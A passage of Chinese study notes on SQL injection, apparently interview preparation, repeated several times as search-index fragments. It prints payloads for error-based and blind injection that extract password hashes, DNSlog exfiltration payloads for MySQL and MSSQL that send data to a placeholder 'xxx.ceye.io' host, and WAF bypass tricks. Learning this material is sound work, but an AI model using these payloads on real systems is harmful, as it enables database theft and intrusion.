测试跨站点脚本（XSS）漏洞：在输入框中注入 JavaScript 代码，尝试看是否能执行该代码，如果能执行，则意味着应用程序存在 XSS 漏洞。 测试 SQL 注入漏洞：在输入框中注入 SQL 代码，尝试看是否能影响后台数据库，如果能影响，则意味着应用程序存在 SQL 注入漏洞。 测试弱口令：尝试使用一些常见的弱口令进行登录，例如“123456”、“password”、“admin”等，以检测应用程序是否容易受到攻击。 测试会话管理：测试应用程序在登录后是否正确维护会话，例如在登录后关闭浏览器并重新打开应用程序，是否需要重新进行登录等。 5.报错注入的函数有哪些？ extractvalue(1, concat(0x5c,(select user()))) updatexml(0x3a,concat(1,(select user())),1) exp((SELECT * from(select user())a))``ST_LatFromGeoHash((select * from(select * from(select user())a)b)) GTID_SUBSET(version(), 1) **SUBSTRING() 函数：**该函数用于从字符串中获取子串。通过构造包含错误的语句，攻击者可以利用该函数来确定字符串值的长度和内容，例如： SELECT SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1),1,1); **LENGTH() 函数：**该函数返回字符串的长度。攻击者可以使用该函数来确定查询结果的长度，并进一步推断数据的内容，例如： SELECT LENGTH((SELECT username from users WHERE id=1)); **ASCII() 函数：**该函数返回字符的 ASCII 值。攻击者可以结合其他函数，例如 SUBSTRING() 和 LENGTH()，来识别字符串值的每个字符，例如： SELECT ASCII(SUBSTRING((SELECT password from users WHERE username='admin'),1,1)); 6.Sql 注入无回显的情况下，利用 DNSlog，mysql 下利用什么构造代码，mssql 下又如何构造？（1）没有回显的情况下，一般编写脚本，进行自动化注入。但与此同时，由于防火墙的存在，容易被封禁IP，可以尝试调整请求频率，有条件的使用代理池进行请求。 （2）此时也可以使用 DNSlog 注入，原理就是把服务器返回的结果放在域名中，然后读取 DNS 解析时的日志，来获取想要的信息。 （3）Mysql 中利用 load_file() 构造payload ’ and if((select load_file(concat(’\\’,(select database()),’.xxx.ceye.io\\abc’))),1,0)# （4）Mssql 下利用 master..xp_dirtree 构造payload DECLARE @host varchar(1024);SELECT @host=(SELECT db_name())+'.xxx.ceye.io';EXEC('master..xp_dirtree\"'+@host+'\\foobar$\"'); 7.SQL注入时 and or 被过滤怎办？1.大小写变形 2.编码 3.添加注释 4.双写法 5.利用符号形式 6.浮点数 #数字被注释 7.函数替代 #符号被注释 8.SQL注入过滤逗号如何处理在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决: select substr(database() from 1 for 1); select mid(database() from 1 for 1); 使用join： union select 1,2 #等价于 union select * from (select 1)a join (select 2)b 使用like： select ascii(mid(user(),1,1))=80 #等价于 select user() like 'r%' 对于limit可以使用offset来绕过： select * from news limit 0,1 # 等价于下面这条SQL语句 select * from news limit 1 offset 0 select * from table1 where id =1 and exists (select * from table2 where ord(substring(username from 1 for 1)=97); 127' UNION SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d JOIN (SELECT 5)e)# select case when substring((select password from mysql.user where user='root') from 1 for 1)='e' then sleep(5) else 0 end # substring((select password from mysql.user where user='root') from -1）='e' 原文：https://blog.csdn.net/nzjdsds/article/details/81322529 https://www.jianshu.com/p/d10785d22db2 9.sql 注入绕过 WAF的 方法？白盒 根据waf的固定规则去寻找有没有漏网之鱼. 黑盒 架构层绕waf 用户本身是进入waf后访问web页面的,只要我们找到web的真实ip,就可以绕过waf 在同网段内,页面与页面之间,服务器与服务器之间,通过waf的防护,然后展示给我们,只要我们在内部服务之间进行访问,即可绕过waf 边界漏洞,同样类似于同网段数据,我们可以利用已知服务器存在的ssrf漏洞,将数据直接发送给同网段的web2进行sql注入. 协议层面绕过waf 基于协议层,有的waf只过滤get请求,而对post请求没有做别的限制,因此,可以将get类型转换成post请求 文件格式,页面只对Content-Type为application/x-www-form-urlencoded数据格式进行过滤,因此我们可以将Content-Tyoe格式修改为multipart/form-data,即可绕过 参数污染 有的waf仅对部分内容进行过滤如 规则层面绕过 1.关键字可以用%（只限 IIS 系列）。比如 select，可以 sel%e%ct 2.注释绕过，如 /*!select*/，/**/，/*!*/，/*!12345*/，# 3.编码绕过如十六进制编码、URL编码、Unicode编码（服务器端未检测或检测不严具有编码形式的关键字） 4.multipart 请求绕过，在 POST 请求中添加一个上传文件，绕过了绝大多数 WAF 5.参数绕过，复制参数，id=1\u0026id=1 6.组合法 如 and 可以用\u0026\u0026再 URL 编码 7.替换法，如 and 改成\u0026\u0026;=可以用 like 或 in 等 8.函数大小写混写绕过（服务器端检测是未开启大小写不敏感） 9.多重关键字绕过如ununion","date":"2023-11-17","objectID":"/hvv_owasptop10/:0:1","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#7sql注入时-and-or-被过滤怎办"},{"categories":["hvv"],"content":"\r01-SQL注入漏洞\r1.原理SQL注入是一种代码注入技术，用于攻击数据驱动的应用程序。在应用程序中，如果没有做恰当的过滤，则可能使得恶意的SQL语句被插入输入字段中执行（例如将数据库内容转储给攻击者）。 2.分类\r(1)注入点的不同分类●数字类型的注入 ●字符串类型的注入 (2)提交方式的不同分类●GET注入 ●POST注入 ●COOKIE注入 ●HTTP注入 (3)获取信息的方式不同分类●基于布尔的盲注 如果数据库中可以查到相应的数据，页面会正常显示，反之异常。 ●基于时间的盲注 无论输入任何数据，页面的效果完全一样，根据页面是否延迟判断出数据库中查询出的结果。 ●基于报错的注入 ●二次注入 ●宽字节注入 有些waf会在我们的提交数据前会被加入\\，\\的编码为%5c,我们在后面加上%df后变为了%df%5c,变成一个繁体汉字運，变成了一个有多个字节的字符。因为用了gbk编码，使这个为一个两字节，绕过了单引号闭合,逃逸了转义 ●盲注和延时注入的共同点？ 都是一个字符一个字符的判断 3.盲注原理将数据库中查询的数据结果进行截断为单个字符，然后同构造逻辑语句。通过判断页面显示是 否异常或页面是否演示来判断数据库中查询的结果 4.一个登录框怎么测试 验证用户名和密码的输入限制：在输入用户名和密码时，需要验证输入的长度、字符类型等是否符合要求。可以尝试输入过长或过短的字符串、特殊字符等来测试应用程序的输入限制。 测试身份认证功能：尝试使用正确的用户名和密码进行登录，并确认登录成功后能够访问受保护的资源。然后尝试使用无效的凭据进行登录，确保会收到相应的错误提示信息。 测试防止暴力破解的措施：如果应用程序有防止暴力破解的措施，例如锁定账户或添加验证码等，需要测试这些措施是否有效。 测试跨站点脚本（XSS）漏洞：在输入框中注入 JavaScript 代码，尝试看是否能执行该代码，如果能执行，则意味着应用程序存在 XSS 漏洞。 测试 SQL 注入漏洞：在输入框中注入 SQL 代码，尝试看是否能影响后台数据库，如果能影响，则意味着应用程序存在 SQL 注入漏洞。 测试弱口令：尝试使用一些常见的弱口令进行登录，例如“123456”、“password”、“admin”等，以检测应用程序是否容易受到攻击。 测试会话管理：测试应用程序在登录后是否正确维护会话，例如在登录后关闭浏览器并重新打开应用程序，是否需要重新进行登录等。 5.报错注入的函数有哪些？ extractvalue(1, concat(0x5c,(select user()))) updatexml(0x3a,concat(1,(select user())),1) exp((SELECT * from(select user())a))``ST_LatFromGeoHash((select * from(select * from(select user())a)b)) GTID_SUBSET(version(), 1) **SUBSTRING() 函数：**该函数用于从字符串中获取子串。通过构造包含错误的语句，攻击者可以利用该函数来确定字符串值的长度和内容，例如： SELECT SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1),1,1); **LENGTH() 函数：**该函数返回字符串的长度。攻击者可以使用该函数来确定查询结果的长度，并进一步推断数据的内容，例如： SELECT LENGTH((SELECT username from users WHERE id=1)); **ASCII() 函数：**该函数返回字符的 ASCII 值。攻击者可以结合其他函数，例如 SUBSTRING() 和 LENGTH()，来识别字符串值的每个字符，例如： SELECT ASCII(SUBSTRING((SELECT password from users WHERE username='admin'),1,1)); 6.Sql 注入无回显的情况下，利用 DNSlog，mysql 下利用什么构造代码，mssql 下又如何构造？（1）没有回显的情况下，一般编写脚本，进行自动化注入。但与此同时，由于防火墙的存在，容易被封禁IP，可以尝试调整请求频率，有条件的使用代理池进行请求。 （2）此时也可以使用 DNSlog 注入，原理就是把服务器返回的结果放在域名中，然后读取 DNS 解析时的日志，来获取想要的信息。 （3）Mysql 中利用 load_file() 构造payload ’ and if((select load_file(concat(’\\’,(select database()),’.xxx.ceye.io\\abc’))),1,0)# （4）Mssql 下利用 master..xp_dirtree 构造payload DECLARE @host varchar(1024);SELECT @host=(SELECT db_name())+'.xxx.ceye.io';EXEC('master..xp_dirtree\"'+@host+'\\foobar$\"'); 7.SQL注入时 and or 被过滤怎办？1.大小写变形 2.编码 3.添加注释 4.双写法 5.利用符号形式 6.浮点数 #数字被注释 7.函数替代 #符号被注释 8.SQL注入过滤逗号如何处理在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决: select substr(database() from 1 for 1); select mid(database() from 1 for 1); 使用join： union select 1,2 #等价于 union select * from (select 1)a join (select 2)b 使用like： select ascii(mid(user(),1,1))=80 #等价于 select user() like 'r%' 对于limit可以使用offset来绕过： select * from news limit 0,1 # 等价于下面这条SQL语句 select * from news limit 1 offset 0 select * from table1 where id =1 and exists (select * from table2 where ord(substring(username from 1 for 1)=97); 127' UNION SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d JOIN (SELECT 5)e)# select case when substring((select password from mysql.user where user='root') from 1 for 1)='e' then sleep(5) else 0 end # substring((select password from mysql.user where user='root') from -1）='e' 原文：https://blog.csdn.net/nzjdsds/article/details/81322529 https://www.jianshu.com/p/d10785d22db2 9.sql 注入绕过 WAF的 方法？白盒 根据waf的固定规则去寻找有没有漏网之鱼. 黑盒 架构层绕waf 用户本身是进入waf后访问web页面的,只要我们找到web的真实ip,就可以绕过waf 在同网段内,页面与页面之间,服务器与服务器之间,通过waf的防护,然后展示给我们,只要我们在内部服务之间进行访问,即可绕过waf 边界漏洞,同样类似于同网段数据,我们可以利用已知服务器存在的ssrf漏洞,将数据直接发送给同网段的web2进行sql注入. 协议层面绕过waf 基于协议层,有的waf只过滤get请求,而对post请求没有做别的限制,因此,可以将get类型转换成post请求 文件格式,页面只对Content-Type为application/x-www-form-urlencoded数据格式进行过滤,因此我们可以将Content-Tyoe格式修改为multipart/form-data,即可绕过 参数污染 有的waf仅对部分内容进行过滤如 规则层面绕过 1.关键字可以用%（只限 IIS 系列）。比如 select，可以 sel%e%ct 2.注释绕过，如 /*!select*/，/**/，/*!*/，/*!12345*/，# 3.编码绕过如十六进制编码、URL编码、Unicode编码（服务器端未检测或检测不严具有编码形式的关键字） 4.multipart 请求绕过，在 POST 请求中添加一个上传文件，绕过了绝大多数 WAF 5.参数绕过，复制参数，id=1\u0026id=1 6.组合法 如 and 可以用\u0026\u0026再 URL 编码 7.替换法，如 and 改成\u0026\u0026;=可以用 like 或 in 等 8.函数大小写混写绕过（服务器端检测是未开启大小写不敏感） 9.多重关键字绕过如ununion","date":"2023-11-17","objectID":"/hvv_owasptop10/:0:1","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#8sql注入过滤逗号如何处理"},{"categories":["hvv"],"content":"\r01-SQL注入漏洞\r1.原理SQL注入是一种代码注入技术，用于攻击数据驱动的应用程序。在应用程序中，如果没有做恰当的过滤，则可能使得恶意的SQL语句被插入输入字段中执行（例如将数据库内容转储给攻击者）。 2.分类\r(1)注入点的不同分类●数字类型的注入 ●字符串类型的注入 (2)提交方式的不同分类●GET注入 ●POST注入 ●COOKIE注入 ●HTTP注入 (3)获取信息的方式不同分类●基于布尔的盲注 如果数据库中可以查到相应的数据，页面会正常显示，反之异常。 ●基于时间的盲注 无论输入任何数据，页面的效果完全一样，根据页面是否延迟判断出数据库中查询出的结果。 ●基于报错的注入 ●二次注入 ●宽字节注入 有些waf会在我们的提交数据前会被加入\\，\\的编码为%5c,我们在后面加上%df后变为了%df%5c,变成一个繁体汉字運，变成了一个有多个字节的字符。因为用了gbk编码，使这个为一个两字节，绕过了单引号闭合,逃逸了转义 ●盲注和延时注入的共同点？ 都是一个字符一个字符的判断 3.盲注原理将数据库中查询的数据结果进行截断为单个字符，然后同构造逻辑语句。通过判断页面显示是 否异常或页面是否演示来判断数据库中查询的结果 4.一个登录框怎么测试 验证用户名和密码的输入限制：在输入用户名和密码时，需要验证输入的长度、字符类型等是否符合要求。可以尝试输入过长或过短的字符串、特殊字符等来测试应用程序的输入限制。 测试身份认证功能：尝试使用正确的用户名和密码进行登录，并确认登录成功后能够访问受保护的资源。然后尝试使用无效的凭据进行登录，确保会收到相应的错误提示信息。 测试防止暴力破解的措施：如果应用程序有防止暴力破解的措施，例如锁定账户或添加验证码等，需要测试这些措施是否有效。 测试跨站点脚本（XSS）漏洞：在输入框中注入 JavaScript 代码，尝试看是否能执行该代码，如果能执行，则意味着应用程序存在 XSS 漏洞。 测试 SQL 注入漏洞：在输入框中注入 SQL 代码，尝试看是否能影响后台数据库，如果能影响，则意味着应用程序存在 SQL 注入漏洞。 测试弱口令：尝试使用一些常见的弱口令进行登录，例如“123456”、“password”、“admin”等，以检测应用程序是否容易受到攻击。 测试会话管理：测试应用程序在登录后是否正确维护会话，例如在登录后关闭浏览器并重新打开应用程序，是否需要重新进行登录等。 5.报错注入的函数有哪些？ extractvalue(1, concat(0x5c,(select user()))) updatexml(0x3a,concat(1,(select user())),1) exp((SELECT * from(select user())a))``ST_LatFromGeoHash((select * from(select * from(select user())a)b)) GTID_SUBSET(version(), 1) **SUBSTRING() 函数：**该函数用于从字符串中获取子串。通过构造包含错误的语句，攻击者可以利用该函数来确定字符串值的长度和内容，例如： SELECT SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1),1,1); **LENGTH() 函数：**该函数返回字符串的长度。攻击者可以使用该函数来确定查询结果的长度，并进一步推断数据的内容，例如： SELECT LENGTH((SELECT username from users WHERE id=1)); **ASCII() 函数：**该函数返回字符的 ASCII 值。攻击者可以结合其他函数，例如 SUBSTRING() 和 LENGTH()，来识别字符串值的每个字符，例如： SELECT ASCII(SUBSTRING((SELECT password from users WHERE username='admin'),1,1)); 6.Sql 注入无回显的情况下，利用 DNSlog，mysql 下利用什么构造代码，mssql 下又如何构造？（1）没有回显的情况下，一般编写脚本，进行自动化注入。但与此同时，由于防火墙的存在，容易被封禁IP，可以尝试调整请求频率，有条件的使用代理池进行请求。 （2）此时也可以使用 DNSlog 注入，原理就是把服务器返回的结果放在域名中，然后读取 DNS 解析时的日志，来获取想要的信息。 （3）Mysql 中利用 load_file() 构造payload ’ and if((select load_file(concat(’\\’,(select database()),’.xxx.ceye.io\\abc’))),1,0)# （4）Mssql 下利用 master..xp_dirtree 构造payload DECLARE @host varchar(1024);SELECT @host=(SELECT db_name())+'.xxx.ceye.io';EXEC('master..xp_dirtree\"'+@host+'\\foobar$\"'); 7.SQL注入时 and or 被过滤怎办？1.大小写变形 2.编码 3.添加注释 4.双写法 5.利用符号形式 6.浮点数 #数字被注释 7.函数替代 #符号被注释 8.SQL注入过滤逗号如何处理在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决: select substr(database() from 1 for 1); select mid(database() from 1 for 1); 使用join： union select 1,2 #等价于 union select * from (select 1)a join (select 2)b 使用like： select ascii(mid(user(),1,1))=80 #等价于 select user() like 'r%' 对于limit可以使用offset来绕过： select * from news limit 0,1 # 等价于下面这条SQL语句 select * from news limit 1 offset 0 select * from table1 where id =1 and exists (select * from table2 where ord(substring(username from 1 for 1)=97); 127' UNION SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d JOIN (SELECT 5)e)# select case when substring((select password from mysql.user where user='root') from 1 for 1)='e' then sleep(5) else 0 end # substring((select password from mysql.user where user='root') from -1）='e' 原文：https://blog.csdn.net/nzjdsds/article/details/81322529 https://www.jianshu.com/p/d10785d22db2 9.sql 注入绕过 WAF的 方法？白盒 根据waf的固定规则去寻找有没有漏网之鱼. 黑盒 架构层绕waf 用户本身是进入waf后访问web页面的,只要我们找到web的真实ip,就可以绕过waf 在同网段内,页面与页面之间,服务器与服务器之间,通过waf的防护,然后展示给我们,只要我们在内部服务之间进行访问,即可绕过waf 边界漏洞,同样类似于同网段数据,我们可以利用已知服务器存在的ssrf漏洞,将数据直接发送给同网段的web2进行sql注入. 协议层面绕过waf 基于协议层,有的waf只过滤get请求,而对post请求没有做别的限制,因此,可以将get类型转换成post请求 文件格式,页面只对Content-Type为application/x-www-form-urlencoded数据格式进行过滤,因此我们可以将Content-Tyoe格式修改为multipart/form-data,即可绕过 参数污染 有的waf仅对部分内容进行过滤如 规则层面绕过 1.关键字可以用%（只限 IIS 系列）。比如 select，可以 sel%e%ct 2.注释绕过，如 /*!select*/，/**/，/*!*/，/*!12345*/，# 3.编码绕过如十六进制编码、URL编码、Unicode编码（服务器端未检测或检测不严具有编码形式的关键字） 4.multipart 请求绕过，在 POST 请求中添加一个上传文件，绕过了绝大多数 WAF 5.参数绕过，复制参数，id=1\u0026id=1 6.组合法 如 and 可以用\u0026\u0026再 URL 编码 7.替换法，如 and 改成\u0026\u0026;=可以用 like 或 in 等 8.函数大小写混写绕过（服务器端检测是未开启大小写不敏感） 9.多重关键字绕过如ununion","date":"2023-11-17","objectID":"/hvv_owasptop10/:0:1","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#9sql-注入绕过-waf的-方法"},{"categories":["hvv"],"content":"\r01-SQL注入漏洞\r1.原理SQL注入是一种代码注入技术，用于攻击数据驱动的应用程序。在应用程序中，如果没有做恰当的过滤，则可能使得恶意的SQL语句被插入输入字段中执行（例如将数据库内容转储给攻击者）。 2.分类\r(1)注入点的不同分类●数字类型的注入 ●字符串类型的注入 (2)提交方式的不同分类●GET注入 ●POST注入 ●COOKIE注入 ●HTTP注入 (3)获取信息的方式不同分类●基于布尔的盲注 如果数据库中可以查到相应的数据，页面会正常显示，反之异常。 ●基于时间的盲注 无论输入任何数据，页面的效果完全一样，根据页面是否延迟判断出数据库中查询出的结果。 ●基于报错的注入 ●二次注入 ●宽字节注入 有些waf会在我们的提交数据前会被加入\\，\\的编码为%5c,我们在后面加上%df后变为了%df%5c,变成一个繁体汉字運，变成了一个有多个字节的字符。因为用了gbk编码，使这个为一个两字节，绕过了单引号闭合,逃逸了转义 ●盲注和延时注入的共同点？ 都是一个字符一个字符的判断 3.盲注原理将数据库中查询的数据结果进行截断为单个字符，然后同构造逻辑语句。通过判断页面显示是 否异常或页面是否演示来判断数据库中查询的结果 4.一个登录框怎么测试 验证用户名和密码的输入限制：在输入用户名和密码时，需要验证输入的长度、字符类型等是否符合要求。可以尝试输入过长或过短的字符串、特殊字符等来测试应用程序的输入限制。 测试身份认证功能：尝试使用正确的用户名和密码进行登录，并确认登录成功后能够访问受保护的资源。然后尝试使用无效的凭据进行登录，确保会收到相应的错误提示信息。 测试防止暴力破解的措施：如果应用程序有防止暴力破解的措施，例如锁定账户或添加验证码等，需要测试这些措施是否有效。 测试跨站点脚本（XSS）漏洞：在输入框中注入 JavaScript 代码，尝试看是否能执行该代码，如果能执行，则意味着应用程序存在 XSS 漏洞。 测试 SQL 注入漏洞：在输入框中注入 SQL 代码，尝试看是否能影响后台数据库，如果能影响，则意味着应用程序存在 SQL 注入漏洞。 测试弱口令：尝试使用一些常见的弱口令进行登录，例如“123456”、“password”、“admin”等，以检测应用程序是否容易受到攻击。 测试会话管理：测试应用程序在登录后是否正确维护会话，例如在登录后关闭浏览器并重新打开应用程序，是否需要重新进行登录等。 5.报错注入的函数有哪些？ extractvalue(1, concat(0x5c,(select user()))) updatexml(0x3a,concat(1,(select user())),1) exp((SELECT * from(select user())a))``ST_LatFromGeoHash((select * from(select * from(select user())a)b)) GTID_SUBSET(version(), 1) **SUBSTRING() 函数：**该函数用于从字符串中获取子串。通过构造包含错误的语句，攻击者可以利用该函数来确定字符串值的长度和内容，例如： SELECT SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1),1,1); **LENGTH() 函数：**该函数返回字符串的长度。攻击者可以使用该函数来确定查询结果的长度，并进一步推断数据的内容，例如： SELECT LENGTH((SELECT username from users WHERE id=1)); **ASCII() 函数：**该函数返回字符的 ASCII 值。攻击者可以结合其他函数，例如 SUBSTRING() 和 LENGTH()，来识别字符串值的每个字符，例如： SELECT ASCII(SUBSTRING((SELECT password from users WHERE username='admin'),1,1)); 6.Sql 注入无回显的情况下，利用 DNSlog，mysql 下利用什么构造代码，mssql 下又如何构造？（1）没有回显的情况下，一般编写脚本，进行自动化注入。但与此同时，由于防火墙的存在，容易被封禁IP，可以尝试调整请求频率，有条件的使用代理池进行请求。 （2）此时也可以使用 DNSlog 注入，原理就是把服务器返回的结果放在域名中，然后读取 DNS 解析时的日志，来获取想要的信息。 （3）Mysql 中利用 load_file() 构造payload ’ and if((select load_file(concat(’\\’,(select database()),’.xxx.ceye.io\\abc’))),1,0)# （4）Mssql 下利用 master..xp_dirtree 构造payload DECLARE @host varchar(1024);SELECT @host=(SELECT db_name())+'.xxx.ceye.io';EXEC('master..xp_dirtree\"'+@host+'\\foobar$\"'); 7.SQL注入时 and or 被过滤怎办？1.大小写变形 2.编码 3.添加注释 4.双写法 5.利用符号形式 6.浮点数 #数字被注释 7.函数替代 #符号被注释 8.SQL注入过滤逗号如何处理在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决: select substr(database() from 1 for 1); select mid(database() from 1 for 1); 使用join： union select 1,2 #等价于 union select * from (select 1)a join (select 2)b 使用like： select ascii(mid(user(),1,1))=80 #等价于 select user() like 'r%' 对于limit可以使用offset来绕过： select * from news limit 0,1 # 等价于下面这条SQL语句 select * from news limit 1 offset 0 select * from table1 where id =1 and exists (select * from table2 where ord(substring(username from 1 for 1)=97); 127' UNION SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d JOIN (SELECT 5)e)# select case when substring((select password from mysql.user where user='root') from 1 for 1)='e' then sleep(5) else 0 end # substring((select password from mysql.user where user='root') from -1）='e' 原文：https://blog.csdn.net/nzjdsds/article/details/81322529 https://www.jianshu.com/p/d10785d22db2 9.sql 注入绕过 WAF的 方法？白盒 根据waf的固定规则去寻找有没有漏网之鱼. 黑盒 架构层绕waf 用户本身是进入waf后访问web页面的,只要我们找到web的真实ip,就可以绕过waf 在同网段内,页面与页面之间,服务器与服务器之间,通过waf的防护,然后展示给我们,只要我们在内部服务之间进行访问,即可绕过waf 边界漏洞,同样类似于同网段数据,我们可以利用已知服务器存在的ssrf漏洞,将数据直接发送给同网段的web2进行sql注入. 协议层面绕过waf 基于协议层,有的waf只过滤get请求,而对post请求没有做别的限制,因此,可以将get类型转换成post请求 文件格式,页面只对Content-Type为application/x-www-form-urlencoded数据格式进行过滤,因此我们可以将Content-Tyoe格式修改为multipart/form-data,即可绕过 参数污染 有的waf仅对部分内容进行过滤如 规则层面绕过 1.关键字可以用%（只限 IIS 系列）。比如 select，可以 sel%e%ct 2.注释绕过，如 /*!select*/，/**/，/*!*/，/*!12345*/，# 3.编码绕过如十六进制编码、URL编码、Unicode编码（服务器端未检测或检测不严具有编码形式的关键字） 4.multipart 请求绕过，在 POST 请求中添加一个上传文件，绕过了绝大多数 WAF 5.参数绕过，复制参数，id=1\u0026id=1 6.组合法 如 and 可以用\u0026\u0026再 URL 编码 7.替换法，如 and 改成\u0026\u0026;=可以用 like 或 in 等 8.函数大小写混写绕过（服务器端检测是未开启大小写不敏感） 9.多重关键字绕过如ununion","date":"2023-11-17","objectID":"/hvv_owasptop10/:0:1","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#10sql注入的告警的流量特征看哪些方面"},{"categories":["hvv"],"content":"\r01-SQL注入漏洞\r1.原理SQL注入是一种代码注入技术，用于攻击数据驱动的应用程序。在应用程序中，如果没有做恰当的过滤，则可能使得恶意的SQL语句被插入输入字段中执行（例如将数据库内容转储给攻击者）。 2.分类\r(1)注入点的不同分类●数字类型的注入 ●字符串类型的注入 (2)提交方式的不同分类●GET注入 ●POST注入 ●COOKIE注入 ●HTTP注入 (3)获取信息的方式不同分类●基于布尔的盲注 如果数据库中可以查到相应的数据，页面会正常显示，反之异常。 ●基于时间的盲注 无论输入任何数据，页面的效果完全一样，根据页面是否延迟判断出数据库中查询出的结果。 ●基于报错的注入 ●二次注入 ●宽字节注入 有些waf会在我们的提交数据前会被加入\\，\\的编码为%5c,我们在后面加上%df后变为了%df%5c,变成一个繁体汉字運，变成了一个有多个字节的字符。因为用了gbk编码，使这个为一个两字节，绕过了单引号闭合,逃逸了转义 ●盲注和延时注入的共同点？ 都是一个字符一个字符的判断 3.盲注原理将数据库中查询的数据结果进行截断为单个字符，然后同构造逻辑语句。通过判断页面显示是 否异常或页面是否演示来判断数据库中查询的结果 4.一个登录框怎么测试 验证用户名和密码的输入限制：在输入用户名和密码时，需要验证输入的长度、字符类型等是否符合要求。可以尝试输入过长或过短的字符串、特殊字符等来测试应用程序的输入限制。 测试身份认证功能：尝试使用正确的用户名和密码进行登录，并确认登录成功后能够访问受保护的资源。然后尝试使用无效的凭据进行登录，确保会收到相应的错误提示信息。 测试防止暴力破解的措施：如果应用程序有防止暴力破解的措施，例如锁定账户或添加验证码等，需要测试这些措施是否有效。 测试跨站点脚本（XSS）漏洞：在输入框中注入 JavaScript 代码，尝试看是否能执行该代码，如果能执行，则意味着应用程序存在 XSS 漏洞。 测试 SQL 注入漏洞：在输入框中注入 SQL 代码，尝试看是否能影响后台数据库，如果能影响，则意味着应用程序存在 SQL 注入漏洞。 测试弱口令：尝试使用一些常见的弱口令进行登录，例如“123456”、“password”、“admin”等，以检测应用程序是否容易受到攻击。 测试会话管理：测试应用程序在登录后是否正确维护会话，例如在登录后关闭浏览器并重新打开应用程序，是否需要重新进行登录等。 5.报错注入的函数有哪些？ extractvalue(1, concat(0x5c,(select user()))) updatexml(0x3a,concat(1,(select user())),1) exp((SELECT * from(select user())a))``ST_LatFromGeoHash((select * from(select * from(select user())a)b)) GTID_SUBSET(version(), 1) **SUBSTRING() 函数：**该函数用于从字符串中获取子串。通过构造包含错误的语句，攻击者可以利用该函数来确定字符串值的长度和内容，例如： SELECT SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1),1,1); **LENGTH() 函数：**该函数返回字符串的长度。攻击者可以使用该函数来确定查询结果的长度，并进一步推断数据的内容，例如： SELECT LENGTH((SELECT username from users WHERE id=1)); **ASCII() 函数：**该函数返回字符的 ASCII 值。攻击者可以结合其他函数，例如 SUBSTRING() 和 LENGTH()，来识别字符串值的每个字符，例如： SELECT ASCII(SUBSTRING((SELECT password from users WHERE username='admin'),1,1)); 6.Sql 注入无回显的情况下，利用 DNSlog，mysql 下利用什么构造代码，mssql 下又如何构造？（1）没有回显的情况下，一般编写脚本，进行自动化注入。但与此同时，由于防火墙的存在，容易被封禁IP，可以尝试调整请求频率，有条件的使用代理池进行请求。 （2）此时也可以使用 DNSlog 注入，原理就是把服务器返回的结果放在域名中，然后读取 DNS 解析时的日志，来获取想要的信息。 （3）Mysql 中利用 load_file() 构造payload ’ and if((select load_file(concat(’\\’,(select database()),’.xxx.ceye.io\\abc’))),1,0)# （4）Mssql 下利用 master..xp_dirtree 构造payload DECLARE @host varchar(1024);SELECT @host=(SELECT db_name())+'.xxx.ceye.io';EXEC('master..xp_dirtree\"'+@host+'\\foobar$\"'); 7.SQL注入时 and or 被过滤怎办？1.大小写变形 2.编码 3.添加注释 4.双写法 5.利用符号形式 6.浮点数 #数字被注释 7.函数替代 #符号被注释 8.SQL注入过滤逗号如何处理在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决: select substr(database() from 1 for 1); select mid(database() from 1 for 1); 使用join： union select 1,2 #等价于 union select * from (select 1)a join (select 2)b 使用like： select ascii(mid(user(),1,1))=80 #等价于 select user() like 'r%' 对于limit可以使用offset来绕过： select * from news limit 0,1 # 等价于下面这条SQL语句 select * from news limit 1 offset 0 select * from table1 where id =1 and exists (select * from table2 where ord(substring(username from 1 for 1)=97); 127' UNION SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d JOIN (SELECT 5)e)# select case when substring((select password from mysql.user where user='root') from 1 for 1)='e' then sleep(5) else 0 end # substring((select password from mysql.user where user='root') from -1）='e' 原文：https://blog.csdn.net/nzjdsds/article/details/81322529 https://www.jianshu.com/p/d10785d22db2 9.sql 注入绕过 WAF的 方法？白盒 根据waf的固定规则去寻找有没有漏网之鱼. 黑盒 架构层绕waf 用户本身是进入waf后访问web页面的,只要我们找到web的真实ip,就可以绕过waf 在同网段内,页面与页面之间,服务器与服务器之间,通过waf的防护,然后展示给我们,只要我们在内部服务之间进行访问,即可绕过waf 边界漏洞,同样类似于同网段数据,我们可以利用已知服务器存在的ssrf漏洞,将数据直接发送给同网段的web2进行sql注入. 协议层面绕过waf 基于协议层,有的waf只过滤get请求,而对post请求没有做别的限制,因此,可以将get类型转换成post请求 文件格式,页面只对Content-Type为application/x-www-form-urlencoded数据格式进行过滤,因此我们可以将Content-Tyoe格式修改为multipart/form-data,即可绕过 参数污染 有的waf仅对部分内容进行过滤如 规则层面绕过 1.关键字可以用%（只限 IIS 系列）。比如 select，可以 sel%e%ct 2.注释绕过，如 